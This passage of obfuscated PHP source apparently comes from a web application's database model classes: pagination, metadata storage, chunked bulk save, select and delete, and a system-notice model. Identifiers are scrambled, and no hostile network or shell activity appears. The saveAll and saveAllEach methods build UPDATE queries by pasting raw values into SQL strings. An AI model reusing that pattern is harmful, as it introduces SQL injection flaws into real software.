isset($in[$Ñ’‘—Î”[363]]) && $in[$Ñ’‘—Î”[363]] ? $in[$Ñ’‘—Î”[363]] : $è‡¨Ÿš…; if ($è‡¨Ÿš… === -1) { $in[$Ñ’‘—Î”[363]] = !1; $ì£ÄüÀ = 100000000; $è‡¨Ÿš… = $ì£ÄüÀ; } $ú´İË = $¢Ğ±Ô­Î; $ú´İË[$Ñ’‘—Î”[365]] = array(); $è‡¨Ÿš… = intval($è‡¨Ÿš…); $è‡¨Ÿš… = $è‡¨Ÿš… <= 5 ? 5 : ($è‡¨Ÿš… >= $ì£ÄüÀ ? $ì£ÄüÀ : $è‡¨Ÿš…); $©Ê™Ü = intval(isset($in[$Ñ’‘—Î”[353]]) && $in[$Ñ’‘—Î”[353]] ? $in[$Ñ’‘—Î”[353]] : $©Ê™Ü); $©Ê™Ü = $©Ê™Ü <= 1 ? 1 : $©Ê™Ü; $àŠá´±® = array(); $àˆËƒ¾í = 1; if ($©Ê™Ü == 1 && $àˆËƒ¾í) { $this->optionsValue($¢Ğ±Ô­Î); $àŠá´±® = $this->page($©Ê™Ü, $è‡¨Ÿš…)->select(); $ÕúÈş—Ô = is_array($àŠá´±®) ? count($àŠá´±®) : 0; if ($ÕúÈş—Ô < $è‡¨Ÿš…) { $¤ˆªÊ× = 1; } else { $this->optionsValue($ú´İË); $ÕúÈş—Ô = intval($this->count()); $¤ˆªÊ× = ceil($ÕúÈş—Ô / $è‡¨Ÿš…); } } else { $this->optionsValue($ú´İË); $ÕúÈş—Ô = intval($this->count()); $¤ˆªÊ× = ceil($ÕúÈş—Ô / $è‡¨Ÿš…); $©Ê™Ü = $©Ê™Ü >= $¤ˆªÊ× ? $¤ˆªÊ× : $©Ê™Ü; $this->optionsValue($¢Ğ±Ô­Î); $àŠá´±® = $this->page($©Ê™Ü, $è‡¨Ÿš…)->select(); } if (!is_array($àŠá´±®)) { $àŠá´±® = array(); } if ($¤ˆªÊ× == 1) { $ÕúÈş—Ô = count($àŠá´±®); } $Ñˆ†ÈÌ¢ = array($Ñ’‘—Î”[366] => array($Ñ’‘—Î”[367] => $ÕúÈş—Ô, $Ñ’‘—Î”[363] => $è‡¨Ÿš…, $Ñ’‘—Î”[353] => $©Ê™Ü, $Ñ’‘—Î”[368] => $¤ˆªÊ×), $Ñ’‘—Î”[369] => $àŠá´±®); return $Ñˆ†ÈÌ¢; } protected function checkLength($¶«ì´Ø, $’·á—Ã = 0, $Ìì»®îÚ = '') { $óËæÄ×’ =& $_SERVER[­õöî’–]; $’·á—Ã = $’·á—Ã ? $’·á—Ã : 65536; if (!$¶«ì´Ø || strlen($¶«ì´Ø) < $’·á—Ã) { return; } $Ìì»®îÚ = $Ìì»®îÚ ? $Ìì»®îÚ . $óËæÄ×’[71] : $óËæÄ×’[12]; show_json($Ìì»®îÚ . LNG($óËæÄ×’[370]) . "\x28{$’·á—Ã}\x29", !1); } protected function metaSet($»€öıñ, $©ğÔûİ = null, $¡È¹÷Ù‰ = null) { $µİ¬¤Î =& $_SERVER[­õöî’–]; if (!$this->tableMeta || !$»€öıñ) { return !1; } $§É¢Êú = $this->tableMeta[$µİ¬¤Î[371]]; $·áçÕ¤ = $this->tableMeta[$µİ¬¤Î[372]]; $ç¨“ÛğÌ = Model($·áçÕ¤); $¡íÒ»ºÑ = array($§É¢Êú => $»€öıñ, $µİ¬¤Î[373] => $©ğÔûİ); if (is_null($©ğÔûİ)) { return $ç¨“ÛğÌ->where(array($§É¢Êú => $»€öıñ))->delete(); } if (is_null($¡È¹÷Ù‰) && is_string($©ğÔûİ)) { return $ç¨“ÛğÌ->where($¡íÒ»ºÑ)->delete(); } $™¤ìÌ¶ú = is_array($©ğÔûİ) ? $©ğÔûİ : array(); if (is_string($©ğÔûİ)) { $™¤ìÌ¶ú[$©ğÔûİ] = $¡È¹÷Ù‰; } $ù¥ü‚Ñ = array(); foreach ($™¤ìÌ¶ú as $’ï‘Ä¨Ö => $İ¿¼Òö) { if (is_null($İ¿¼Òö) && is_string($’ï‘Ä¨Ö)) { $ç¨“ÛğÌ->where(array($§É¢Êú => $»€öıñ, $µİ¬¤Î[373] => $’ï‘Ä¨Ö))->delete(); continue; } $this->checkLength($İ¿¼Òö, !1, $·áçÕ¤ . $µİ¬¤Î[4] . $’ï‘Ä¨Ö); $ù¥ü‚Ñ[] = array($§É¢Êú => $»€öıñ, $µİ¬¤Î[94] => $’ï‘Ä¨Ö, $µİ¬¤Î[374] => $İ¿¼Òö); } $å¤ı¦˜‚ = $µİ¬¤Î[375] . $·áçÕ¤; CacheLock::lock($å¤ı¦˜‚); $ç¨“ÛğÌ->where(array($§É¢Êú => $»€öıñ))->addAll($ù¥ü‚Ñ, array(), !0); CacheLock::unlock($å¤ı¦˜‚); return !0; } public function metaGet($ÉÕŒ‘É, $ƒé˜×Ğ = false) { $áò¢ñ†Ï =& $_SERVER[­õöî’–]; if (!$this->tableMeta) { return array(); } $êåæÍ´ë = $this->tableMeta[$áò¢ñ†Ï[371]]; $ÒèØÂŞ¶ = Model($this->tableMeta[$áò¢ñ†Ï[372]]); if ($ƒé˜×Ğ) { $Ûç³âÏÂ = array($êåæÍ´ë => $ÉÕŒ‘É, $áò¢ñ†Ï[94] => $ƒé˜×Ğ); return $ÒèØÂŞ¶->where($Ûç³âÏÂ)->getField($áò¢ñ†Ï[374]); } $Ûç³âÏÂ = array($êåæÍ´ë => $ÉÕŒ‘É); $£Ïó¹Â¤ = $ÒèØÂŞ¶->field($áò¢ñ†Ï[376])->where($Ûç³âÏÂ)->select(); $£Ïó¹Â¤ = array_to_keyvalue($£Ïó¹Â¤, $áò¢ñ†Ï[94], $áò¢ñ†Ï[374]); return $£Ïó¹Â¤; } private function checkDataAutoHas($ìÎ¾çÄß) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ßÙÏìÃÄ) { if (in_array($ìÎ¾çÄß, explode($_SERVER[­õöî’–][50], $ßÙÏìÃÄ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$Ü•œ±ô§, $…‡ÑĞ½£) { $ÎÍ€àí® =& $_SERVER[­õöî’–]; if (!is_array($Ü•œ±ô§)) { return; } foreach ($this->dataAuto as $ƒ¾Ø‹è) { $šœ©²Ş× = $ƒ¾Ø‹è[0]; if (!in_array($…‡ÑĞ½£, explode($ÎÍ€àí®[50], $ƒ¾Ø‹è[2]))) { continue; } switch (trim($ƒ¾Ø‹è[3])) { case $ÎÍ€àí®[321]: case $ÎÍ€àí®[322]: $ ÜÆë¯˜ = $ƒ¾Ø‹è[1]; $§£»˜íº = isset($ƒ¾Ø‹è[4]) ? (array) $ƒ¾Ø‹è[4] : array(); if ($ ÜÆë¯˜ == $ÎÍ€àí®[203] && array_key_exists($šœ©²Ş×, $Ü•œ±ô§)) { if (!$Ü•œ±ô§[$šœ©²Ş×]) { unset($Ü•œ±ô§[$šœ©²Ş×]); } break; } if (isset($Ü•œ±ô§[$šœ©²Ş×])) { array_unshift($§£»˜íº, $Ü•œ±ô§[$šœ©²Ş×]); } if ($ÎÍ€àí®[321] == $ƒ¾Ø‹è[3]) { $Ü•œ±ô§[$šœ©²Ş×] = call_user_func_array($ ÜÆë¯˜, $§£»˜íº); } else { $Ü•œ±ô§[$šœ©²Ş×] = call_user_func_array(array(&$this, $ ÜÆë¯˜), $§£»˜íº); } break; case $ÎÍ€àí®[270]: if (isset($Ü•œ±ô§[$šœ©²Ş×]) && $Ü•œ±ô§[$šœ©²Ş×]) { $Ü•œ±ô§[$šœ©²Ş×] = call_user_func_array(array(&$this, $ƒ¾Ø‹è[1]), array($Ü•œ±ô§[$šœ©²Ş×])); } break; case $ÎÍ€àí®[273]: $Ü•œ±ô§[$šœ©²Ş×] = $Ü•œ±ô§[$ƒ¾Ø‹è[1]]; break; case $ÎÍ€àí®[294]: if (isset($Ü•œ±ô§[$šœ©²Ş×]) && !is_string($Ü•œ±ô§[$šœ©²Ş×])) { $Ü•œ±ô§[$šœ©²Ş×] = json_encode_force($Ü•œ±ô§[$šœ©²Ş×]); } break; case $ÎÍ€àí®[323]: if ($Ü•œ±ô§[$šœ©²Ş×] === $ÎÍ€àí®[12]) { unset($Ü•œ±ô§[$šœ©²Ş×]); } break; case $ÎÍ€àí®[324]: $Ü•œ±ô§[$šœ©²Ş×] = $ƒ¾Ø‹è[1]; default: break; } } if ($…‡ÑĞ½£ == $ÎÍ€àí®[355]) { $°Ã­é‡ = strtolower($this->db->getDbType()); if (strpos($°Ã­é‡, $ÎÍ€àí®[13]) !== 0) { return; } $¢¬ÅÙ›¦ = $this->field(!0)->fields; $³şâ¾ı± = $¢¬ÅÙ›¦[$ÎÍ€àí®[252]]; if (isset($¢¬ÅÙ›¦[$ÎÍ€àí®[251]])) { unset($³şâ¾ı±[$¢¬ÅÙ›¦[$ÎÍ€àí®[251]]]); } foreach ($³şâ¾ı± as $£ñ—İûì => $…‡ÑĞ½£) { if (!isset($Ü•œ±ô§[$£ñ—İûì])) { $Ü•œ±ô§[$£ñ—İûì] = $ÎÍ€àí®[12]; } } } } private function dataAfterFilter(&$ÑÂ©°Ì) { $ÉÜ Ü =& $_SERVER[­õöî’–]; foreach ($this->dataAuto as $ Í‘ğÏ) { $´ÜÂ¯¿„ = $ Í‘ğÏ[0]; if (!isset($ÑÂ©°Ì[$´ÜÂ¯¿„])) { continue; } if (!in_array($ÉÜ Ü[357], explode($ÉÜ Ü[50], $ Í‘ğÏ[2]))) { continue; } switch (trim($ Í‘ğÏ[3])) { case $ÉÜ Ü[321]: case $ÉÜ Ü[322]: $±ÃñÓæÆ = isset($ Í‘ğÏ[4]) ? (array) $ Í‘ğÏ[4] : array(); array_unshift($±ÃñÓæÆ, $ÑÂ©°Ì[$´ÜÂ¯¿„]); if (isset($ Í‘ğÏ[4]) && $ Í‘ğÏ[4] == $ÉÜ Ü[377]) { $±ÃñÓæÆ = array($ÑÂ©°Ì[$´ÜÂ¯¿„]); } if ($ÉÜ Ü[321] == $ Í‘ğÏ[3]) { $ÑÂ©°Ì[$´ÜÂ¯¿„] = call_user_func_array($ Í‘ğÏ[1], $±ÃñÓæÆ); } else { $ÑÂ©°Ì[$´ÜÂ¯¿„] = call_user_func_array(array(&$this, $ Í‘ğÏ[1]), $±ÃñÓæÆ); } break; case $ÉÜ Ü[270]: if (isset($ÑÂ©°Ì[$´ÜÂ¯¿„]) && $ÑÂ©°Ì[$´ÜÂ¯¿„]) { $ÑÂ©°Ì[$´ÜÂ¯¿„] = call_user_func_array(array(&$this, $ Í‘ğÏ[1]), array($ÑÂ©°Ì[$´ÜÂ¯¿„])); } break; case $ÉÜ Ü[273]: $ÑÂ©°Ì[$´ÜÂ¯¿„] = $ÑÂ©°Ì[$ Í‘ğÏ[1]]; break; case $ÉÜ Ü[294]: $à•û¥ä¦ = $ÑÂ©°Ì[$´ÜÂ¯¿„]; $ÑÂ©°Ì[$´ÜÂ¯¿„] = json_decode($à•û¥ä¦, !0); if (is_null($ÑÂ©°Ì[$´ÜÂ¯¿„])) { $ÑÂ©°Ì[$´ÜÂ¯¿„] = $à•û¥ä¦; } break; case $ÉÜ Ü[323]: if ($ÑÂ©°Ì[$´ÜÂ¯¿„] === $ÉÜ Ü[12]) { unset($ÑÂ©°Ì[$´ÜÂ¯¿„]); } break; case $ÉÜ Ü[324]: $ÑÂ©°Ì[$´ÜÂ¯¿„] = $ Í‘ğÏ[1]; break; default: break; } } } public function saveAll($æ’òáÛ½) { $ûÓêà· =& $_SERVER[­õöî’–]; $ÑÜİšÑÏ = $this->tablePrefix . $this->tableName; $¶¤áÂáª = self::SQL_WHERE_IN_CHUNK; $æ’òáÛ½ = is_array($æ’òáÛ½) ? $æ’òáÛ½ : array(); $½Ã›æõÌ = $ûÓêà·[378]; $°Çå¶­ƒ = 0; $µ‡ŠñË¦ = array(); $¨Íù˜³Ë = count($æ’òáÛ½); for ($‡ºÄÇá¥ = 0; $‡ºÄÇá¥ < $¨Íù˜³Ë; $‡ºÄÇá¥++) { $¢ğ–ÉÀ = $æ’òáÛ½[$‡ºÄÇá¥]; if (!is_array($¢ğ–ÉÀ) || count($¢ğ–ÉÀ) != 4) { continue; } $–„¨ÚŠÁ = "\x55\x50\x44\101\124\x45\x20\x60{$ÑÜİšÑÏ}\140\x20\123\x45\124\x20{$¢ğ–ÉÀ[2]}\40\75\40\x43\101\123\105\40{$¢ğ–ÉÀ[0]}\x20\12"; if ($°Çå¶­ƒ == 0) { $½Ã›æõÌ = $–„¨ÚŠÁ; } $µ‡ŠñË¦[] = $ûÓêà·[118] . $¢ğ–ÉÀ[1] . $ûÓêà·[118]; $°Çå¶­ƒ++; $½Ã›æõÌ .= "\x20\x57\110\x45\116\40\x27{$¢ğ–ÉÀ[1]}\x27\40\124\x48\x45\116\40\x27{$¢ğ–ÉÀ[3]}\47\x20\xa"; if ($°Çå¶­ƒ == $¶¤áÂáª || $‡ºÄÇá¥ == $¨Íù˜³Ë - 1) { $·ÙªÏ˜ç = implode($ûÓêà·[50], $µ‡ŠñË¦); $½Ã›æõÌ .= "\x20\105\x4e\104\40\40\127\x48\x45\122\105\x20{$¢ğ–ÉÀ[0]}\40\111\x4e\x20\x28{$·ÙªÏ˜ç}\51\40"; $this->execute($½Ã›æõÌ); $°Çå¶­ƒ = 0; $½Ã›æõÌ = $–„¨ÚŠÁ; $this->chunkEventCheck(count($µ‡ŠñË¦)); $µ‡ŠñË¦ = array(); } } $this->chunkEventSet(); } public function saveAllEach($ÄÑ‚Š×) { $¨œÍ±ªÂ =& $_SERVER[­õöî’–]; $°ï¡¥éí = $this->tablePrefix . $this->tableName; foreach ($ÄÑ‚Š× as $¶®íÏŒ) { if (!is_array($¶®íÏŒ) || count($¶®íÏŒ) != 4) { continue; } $æóµ°™¯ = $¶®íÏŒ[0] . $¨œÍ±ªÂ[379] . $¶®íÏŒ[1] . $¨œÍ±ªÂ[118]; $¬‘çàú‰ = $¶®íÏŒ[2] . $¨œÍ±ªÂ[379] . $¶®íÏŒ[3] . $¨œÍ±ªÂ[118]; $²¨”ÂÏ = "\x75\160\x64\x61\164\x65\40{$°ï¡¥éí}\40\163\x65\164\40{$¬‘çàú‰}\40\167\150\x65\162\145\x20{$æóµ°™¯}\73"; $this->execute($²¨”ÂÏ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($¦ˆœôÔÕ = false, $Îş¿êí· = false) { $this->_chunkEvent = $¦ˆœôÔÕ; $this->_chunkEventParam = $Îş¿êí·; } private function chunkEventCheck($­÷«íœä) { if (!$this->_chunkEvent) { return; } $“œıÌø = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $“œıÌø[$_SERVER[­õöî’–][380]] = $­÷«íœä; Hook::trigger($this->_chunkEvent, $“œıÌø); } public function addAll($Û¹¨´Šî, $ÚÂù²©¶ = array(), $•¸Ô…ôŞ = false) { $šèˆªÕ» =& $_SERVER[­õöî’–]; ignore_timeout(); $©Ñ®îù = self::SQL_WHERE_IN_CHUNK; if (empty($Û¹¨´Šî)) { $this->error = think_lang($šèˆªÕ»[271]); return !1; } $ÚÂù²©¶ = $this->_parseOptions($ÚÂù²©¶); foreach ($Û¹¨´Šî as $ ¹ÌÊëæ => $ÅŒöŠÇñ) { $Û¹¨´Šî[$ ¹ÌÊëæ] = $this->_facade($ÅŒöŠÇñ); $this->_beforeInsert($Û¹¨´Šî[$ ¹ÌÊëæ], $ÚÂù²©¶); } if (method_exists($this->db, $šèˆªÕ»[272])) { for ($èá¦£ÑÊ = 0; $èá¦£ÑÊ < count($Û¹¨´Šî); $èá¦£ÑÊ += $©Ñ®îù) { $•ÎÓÛ¥— = array_slice($Û¹¨´Šî, $èá¦£ÑÊ, $©Ñ®îù); if (!is_array($•ÎÓÛ¥—) || count($•ÎÓÛ¥—) == 0) { break; } $ÂÚŸ‡ùğ = $this->db->insertAll($•ÎÓÛ¥—, $ÚÂù²©¶, $•¸Ô…ôŞ); $this->chunkEventCheck(count($•ÎÓÛ¥—)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Û¹¨´Šî as $ ¹ÌÊëæ => $ÅŒöŠÇñ) { $ÂÚŸ‡ùğ = $this->db->insert($ÅŒöŠÇñ, $ÚÂù²©¶, $•¸Ô…ôŞ); } $this->commit(); } if (!1 !== $ÂÚŸ‡ùğ) { $ñŸé‡ç÷ = $this->getLastInsID(); if ($ñŸé‡ç÷) { return $ñŸé‡ç÷; } } return $ÂÚŸ‡ùğ; } public function save($† Ñ­Œ÷ = '', $„á¦×Ê = array()) { $Â€üÃ…Á =& $_SERVER[­õöî’–]; $¸ƒ¹şé” = self::SQL_WHERE_IN_CHUNK; $ú¹—À“ = $this->optionsValue(); $¨®¯áæî = $this->findWhereField($ú¹—À“); if (!$¨®¯áæî) { return parent::save($† Ñ­Œ÷, $„á¦×Ê); } $´¾›»¢¦ = 0; $»‹Ğ¼Ë = $ú¹—À“[$Â€üÃ…Á[275]][$¨®¯áæî][1]; $»‹Ğ¼Ë = is_array($»‹Ğ¼Ë) ? $»‹Ğ¼Ë : array(); $½¬§öªğ = count($»‹Ğ¼Ë); for ($òó¿Ş²ë = 0; $òó¿Ş²ë < $½¬§öªğ; $òó¿Ş²ë += $¸ƒ¹şé”) { $ÖâŞşø = array_slice($»‹Ğ¼Ë, $òó¿Ş²ë, $¸ƒ¹şé”); if (!is_array($ÖâŞşø) || count($ÖâŞşø) == 0) { break; } $ú¹—À“[$Â€üÃ…Á[275]][$¨®¯áæî][1] = $ÖâŞşø; $this->optionsValue($ú¹—À“); $´¾›»¢¦ += parent::save($† Ñ­Œ÷, $„á¦×Ê); $this->chunkEventCheck(count($ÖâŞşø)); } $this->chunkEventSet(); return $´¾›»¢¦; } public function add($‰à‰²„š = '', $›Üçã¶Ó = array(), $øÉû·›Ó = false) { if ($this->addTaskStatus && is_array($‰à‰²„š)) { $this->addTaskData[] = $‰à‰²„š; return; } return parent::add($‰à‰²„š, $›Üçã¶Ó, $øÉû·›Ó); } public function parseWhereLike($«’ÏÊÖÆ, $ö±’„ê¯ = '', $õŒ‚Ë©ı = false, &$¥÷ß¤ñ = false) { $¯ê¡Éí» =& $_SERVER[­õöî’–]; $„õåæ®Ü = $GLOBALS[$¯ê¡Éí»[6]][$¯ê¡Éí»[381]]; if (!$„õåæ®Ü[$¯ê¡Éí»[382]]) { return $«’ÏÊÖÆ; } if (!is_array($«’ÏÊÖÆ)) { return $«’ÏÊÖÆ; } $ÆÁñ³œö = array(); $Å¤ÓÊşæ = 0; foreach ($«’ÏÊÖÆ as $Üñ’º¸ => $®¥˜ ‡Š) { if (is_array($®¥˜ ‡Š) && count($®¥˜ ‡Š) == 2 && $®¥˜ ‡Š[0] == $¯ê¡Éí»[383] && is_string($®¥˜ ‡Š[1]) && substr($®¥˜ ‡Š[1], 0, 1) == $¯ê¡Éí»[384] && substr($®¥˜ ‡Š[1], strlen($®¥˜ ‡Š[1]) - 1, 1) == $¯ê¡Éí»[384]) { $¥÷ß¤ñ = !0; $Êıõõ = is_string($Üñ’º¸) ? $Üñ’º¸ : $ö±’„ê¯; $½Û×òè = substr($®¥˜ ‡Š[1], 1, strlen($®¥˜ ‡Š[1]) - 2); $½Û×òè = $this->db->escapeString($½Û×òè); if (!strpos($Êıõõ, $¯ê¡Éí»[10])) { $Êıõõ = $¯ê¡Éí»[385] . $Êıõõ . $¯ê¡Éí»[385]; } $Ã—¥õÎ¡ = $¯ê¡Éí»[188] . $½Û×òè . $¯ê¡Éí»[188]; $½Û×òè = str_replace(array($¯ê¡Éí»[10], $¯ê¡Éí»[386], $¯ê¡Éí»[11]), $¯ê¡Éí»[387], $½Û×òè); if ($„õåæ®Ü[$¯ê¡Éí»[388]]) { $Ã—¥õÎ¡ = $¯ê¡Éí»[389] . $½Û×òè . $¯ê¡Éí»[390]; if ($„õåæ®Ü[$¯ê¡Éí»[391]]) { $Ã—¥õÎ¡ = $¯ê¡Éí»[390] . $½Û×òè . $¯ê¡Éí»[389]; } } $ÆÁñ³œö[$Å¤ÓÊşæ] = $¯ê¡Éí»[392] . $Êıõõ . $¯ê¡Éí»[393] . $Ã—¥õÎ¡ . $¯ê¡Éí»[394]; $Å¤ÓÊşæ++; continue; } if (is_array($®¥˜ ‡Š)) { $ö±’„ê¯ = is_string($Üñ’º¸) ? $Üñ’º¸ : $ö±’„ê¯; $®¥˜ ‡Š = $this->parseWhereLike($®¥˜ ‡Š, $ö±’„ê¯, !0, $¥÷ß¤ñ); } if (is_numeric($Üñ’º¸)) { $ÆÁñ³œö[$Å¤ÓÊşæ] = $®¥˜ ‡Š; $Å¤ÓÊşæ++; } else { $ÆÁñ³œö[$Üñ’º¸] = $®¥˜ ‡Š; } } if ($¥÷ß¤ñ && !$õŒ‚Ë©ı) { } return $ÆÁñ³œö; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($–°±–µ¹ = array()) { $âÓ»ø¨ =& $_SERVER[­õöî’–]; $Ú¯·ø’È = self::SQL_WHERE_IN_CHUNK; $¾¯ÏË¸ = $this->optionsValue(); $èµ¥ñœ = $this->findWhereField($¾¯ÏË¸); if (!$èµ¥ñœ || isset($¾¯ÏË¸[$âÓ»ø¨[292]]) || isset($¾¯ÏË¸[$âÓ»ø¨[353]])) { return parent::select($–°±–µ¹); } $ñÖñ×Àå = $¾¯ÏË¸[$âÓ»ø¨[275]][$èµ¥ñœ][1]; $ñÖñ×Àå = is_array($ñÖñ×Àå) ? $ñÖñ×Àå : array(); $“€ÇŒÏƒ = null; for ($¶Ö…ä‚É = 0; $¶Ö…ä‚É < count($ñÖñ×Àå); $¶Ö…ä‚É += $Ú¯·ø’È) { $«¦Ä²¢Ä = array_slice($ñÖñ×Àå, $¶Ö…ä‚É, $Ú¯·ø’È); if (!is_array($«¦Ä²¢Ä) || count($«¦Ä²¢Ä) == 0) { break; } $¾¯ÏË¸[$âÓ»ø¨[275]][$èµ¥ñœ][1] = $«¦Ä²¢Ä; $this->optionsValue($¾¯ÏË¸); $²¦¼„°˜ = parent::select($–°±–µ¹); if (!$²¦¼„°˜) { continue; } $“€ÇŒÏƒ = is_array($“€ÇŒÏƒ) ? $“€ÇŒÏƒ : array(); $“€ÇŒÏƒ = array_merge($“€ÇŒÏƒ, $²¦¼„°˜); } return $“€ÇŒÏƒ; } public function delete($†—Çµ¯Ğ = array()) { $ÂÕÀÃ¹® =& $_SERVER[­õöî’–]; $æ·ˆÇÎİ = self::SQL_WHERE_IN_CHUNK; $¹€ï–Š = $this->optionsValue(); $Ñä„“çŸ = $this->findWhereField($¹€ï–Š); if (!$Ñä„“çŸ) { return parent::delete($†—Çµ¯Ğ); } $ßˆ´ÔÉœ = 0; $ı‡»•ù³ = $¹€ï–Š[$ÂÕÀÃ¹®[275]][$Ñä„“çŸ][1]; $ı‡»•ù³ = is_array($ı‡»•ù³) ? $ı‡»•ù³ : array(); for ($Õó¯ìç = 0; $Õó¯ìç < count($ı‡»•ù³); $Õó¯ìç += $æ·ˆÇÎİ) { $‘½‡¯ö = array_slice($ı‡»•ù³, $Õó¯ìç, $æ·ˆÇÎİ); if (!is_array($‘½‡¯ö) || count($‘½‡¯ö) == 0) { break; } $¹€ï–Š[$ÂÕÀÃ¹®[275]][$Ñä„“çŸ][1] = $‘½‡¯ö; $this->optionsValue($¹€ï–Š); $ßˆ´ÔÉœ += parent::delete($†—Çµ¯Ğ); } return $ßˆ´ÔÉœ; } private function findWhereField($üöâÏÅå) { $ßÙ¾ıÆë =& $_SERVER[­õöî’–]; $È©í¤“ï = self::SQL_WHERE_IN_CHUNK; if (!is_array($üöâÏÅå) || !is_array($üöâÏÅå[$ßÙ¾ıÆë[275]])) { return !1; } foreach ($üöâÏÅå[$ßÙ¾ıÆë[275]] as $…ÇÆÓçÇ => $­ß‰Çªµ) { if (is_array($­ß‰Çªµ) && isset($­ß‰Çªµ[0]) && is_string($­ß‰Çªµ[0]) && strtolower($­ß‰Çªµ[0]) == $ßÙ¾ıÆë[7] && is_array($­ß‰Çªµ[1]) && count($­ß‰Çªµ[1]) > $È©í¤“ï) { ignore_timeout(); return $…ÇÆÓçÇ; } } return !1; } public function setMasterDB($‹Ş‹Ò“ò = true) { think_config($_SERVER[­õöî’–][395], $‹Ş‹Ò“ò); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\164\x65\155\x4f\160\164\x69\157\156"; public $field = array(); public function listData($ŸÚ¹ñ™ş = false, $ŞµÂ‚¯‹ = "\155\157\x64\151\146\x79\x54\x69\155\145", $š¾™¹ª¨ = false) { $¯Ó±ç÷° = Model($this->modelType)->get(!1, $this->optionType, !0); $í´Ïä­Ú = array_values($¯Ó±ç÷°); if ($í´Ïä­Ú && $í´Ïä­Ú[0] && !is_array($í´Ïä­Ú[0])) { Model($this->modelType)->cacheRemove($this->optionType); $¯Ó±ç÷° = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$¯Ó±ç÷°) { return $ŸÚ¹ñ™ş ? null : array(); } if (!$ŸÚ¹ñ™ş) { $¯Ó±ç÷° = array_filter(array_values($¯Ó±ç÷°)); return array_sort_by($¯Ó±ç÷°, $ŞµÂ‚¯‹, $š¾™¹ª¨); } return $¯Ó±ç÷°[$_SERVER[­õöî’–][396] . $ŸÚ¹ñ™ş]; } public function insert($Ïôš¬) { $…ÑÃÃß¤ =& $_SERVER[­õöî’–]; $Ïôš¬ = array_field_key($Ïôš¬, $this->field); $Òàœ¬…ä = Model($this->modelType)->get($…ÑÃÃß¤[397], $this->optionType . $…ÑÃÃß¤[398]); $Òàœ¬…ä = $Òàœ¬…ä ? $Òàœ¬…ä : 0; $Ïôš¬[$…ÑÃÃß¤[399]] = ++$Òàœ¬…ä; $Ïôš¬[$…ÑÃÃß¤[200]] = time(); $Ïôš¬[$…ÑÃÃß¤[85]] = time(); Model($this->modelType)->set($…ÑÃÃß¤[397], $Òàœ¬…ä, $this->optionType . $…ÑÃÃß¤[398]); Model($this->modelType)->set($…ÑÃÃß¤[396] . $Òàœ¬…ä, $Ïôš¬, $this->optionType); return $Òàœ¬…ä; } public function update($â§Šù×, $•şæ¤¾Ï) { $¦éÃ¾ˆ© =& $_SERVER[­õöî’–]; $•şæ¤¾Ï = array_field_key($•şæ¤¾Ï, $this->field); $º¹¢¦ÓÓ = $this->listData($â§Šù×); if (!$º¹¢¦ÓÓ || !$â§Šù×) { return !1; } $•şæ¤¾Ï = array_merge($º¹¢¦ÓÓ, $•şæ¤¾Ï); $•şæ¤¾Ï[$¦éÃ¾ˆ©[85]] = time(); return Model($this->modelType)->set($¦éÃ¾ˆ©[396] . $â§Šù×, $•şæ¤¾Ï, $this->optionType); } public function remove($ÌîÇÍ¥) { if (!$ÌîÇÍ¥) { return !1; } return Model($this->modelType)->remove($_SERVER[­õöî’–][396] . $ÌîÇÍ¥, $this->optionType); } public function clear() { $¬Â³µığ =& $_SERVER[­õöî’–]; Model($this->modelType)->remove($¬Â³µığ[397], $this->optionType . $¬Â³µığ[398]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ñè“œ•, $ª°•â£·) { if (!$ª°•â£·) { return !1; } $©üîÖ² = $this->listData(); $©üîÖ² = array_to_keyvalue($©üîÖ², $ñè“œ•); return isset($©üîÖ²[$ª°•â£·]) ? $©üîÖ²[$ª°•â£·] : !1; } public function findByName($Œ´ê…ûƒ) { return $this->findByKey($_SERVER[­õöî’–][32], $Œ´ê…ûƒ); } protected function resetData($•€Ğ•šÀ) { $ÃØ†©¸ =& $_SERVER[­õöî’–]; $•€Ğ•šÀ = is_array($•€Ğ•šÀ) ? $•€Ğ•šÀ : array(); $ÁÆ‰¬Ç = array(); for ($ëµ¨à¾ó = 0; $ëµ¨à¾ó < count($•€Ğ•šÀ); $ëµ¨à¾ó++) { $ÁÆ‰¬Ç[$ÃØ†©¸[396] . $•€Ğ•šÀ[$ëµ¨à¾ó][$ÃØ†©¸[399]]] = $•€Ğ•šÀ[$ëµ¨à¾ó]; } return Model($this->modelType)->set($ÁÆ‰¬Ç, !1, $this->optionType); } private function getAutoName($Ë¡ÆÑ°) { $çÖ›°½Á = array_to_keyvalue($this->listData(), $_SERVER[­õöî’–][32]); if (!$çÖ›°½Á || !isset($çÖ›°½Á[$Ë¡ÆÑ°])) { return $Ë¡ÆÑ°; } for ($Í¸ë·ˆ = 1; $Í¸ë·ˆ < count($çÖ›°½Á); $Í¸ë·ˆ++) { $›ì³å¼¬ = $Ë¡ÆÑ° . "\50{$Í¸ë·ˆ}\x29"; if (!isset($çÖ›°½Á[$›ì³å¼¬])) { return $›ì³å¼¬; } } return $›ì³å¼¬; } } goto fô‹æ‹ã‘˜; Eî†¸¸±¥é: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\x2e\x6e\157\x74\151\143\145\114\151\163\164"; public $field = array("\x6e\141\155\145", "\143\x6f\156\164\x65\156\x74", "\x61\165\164\x68", "\155\x6f\x64\x65", "\164\x69\155\145", "\x74\x79\160\145", "\x6c\145\166\145\x6c", "\145\156\141\142\x6c\x65", "\x73\157\x72\x74"); public function listData($ÜÓ…Ëİ÷ = false, $ÄŒŒÅ² = "\163\x6f\x72\x74", $ÕŸÚÍ• = false) { return parent::listData($ÜÓ…Ëİ÷, $ÄŒŒÅ², $ÕŸÚÍ•); } public function add($åÊô˜ëõ) { $¯ÃŸ¦Í£ =& 